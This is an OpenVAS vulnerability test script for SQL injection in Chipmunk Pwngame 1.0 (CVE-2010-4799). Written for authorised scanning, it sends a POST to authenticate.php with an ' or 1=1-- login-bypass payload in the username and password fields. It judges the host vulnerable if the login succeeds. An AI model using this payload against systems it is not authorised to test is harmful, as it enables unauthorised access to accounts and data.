##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_chipmunk_pwngame_mult_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Chipmunk Pwngame Multiple SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to access or modify data,
  or exploit latent vulnerabilities in the underlying database or bypass the
  log-in mechanism.
  Impact Level: Application.";
tag_affected = "Chipmunk Pwngame version 1.0";

tag_insight = "Input passed via the 'username' parameter to 'authenticate.php' and 'ID'
  parameter to 'pwn.php' is not properly sanitised before being used in an SQL
  query.";
tag_solution = "No solution or patch is available as of 29th April, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.chipmunk-scripts.com/page.php?ID=34";
tag_summary = "This host is running Chipmunk Pwngame and is prone multiple SQL
  injection vulnerabilities.";

if(description)
{
  script_id(902368);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-11 15:50:14 +0200 (Wed, 11 May 2011)");
  script_cve_id("CVE-2010-4799");
  script_bugtraq_id(43906);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Chipmunk Pwngame Multiple SQL Injection Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/41760/");
  script_xref(name : "URL" , value : "http://securityreason.com/exploitalert/9240");

  script_description(desc);
  script_summary("Check if Chipmunk Pwngame is vulnerable to SQL injection attacks");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}
		

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

cpPort = get_http_port(default:80);
if(!cpPort){
  exit(0);
}

foreach dir (make_list("/pwngame", "/", cgi_dirs()))
{
  ## Send and Recieve the response
  sndReq = http_get(item:string(dir, "/pwn.php"), port:cpPort);
  rcvRes = http_keepalive_send_recv(port:cpPort, data:sndReq);

  ## Confirm the application
  if(">Chipmunk Scripts<" >< rcvRes)
  {
    ## Try an exploit
    filename = string(dir + "/authenticate.php");
    host = get_host_name();

    authVariables = "username=%27+or+1%3D1--+-H4x0reSEC&password=%27+or+1%3D1--" +
                    "+-H4x0reSEC&submit=submit";
    
    ## Construct post request
    sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded", "\r\n",
                    "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                     authVariables);
    rcvRes = http_keepalive_send_recv(port:cpPort, data:sndReq);

    ## Check the Response
    if(">Thanks for logging in" >< rcvRes && ">Main player Page<" >< rcvRes)
    {
      security_hole(cpPort);
      exit(0);
    }
  }
}
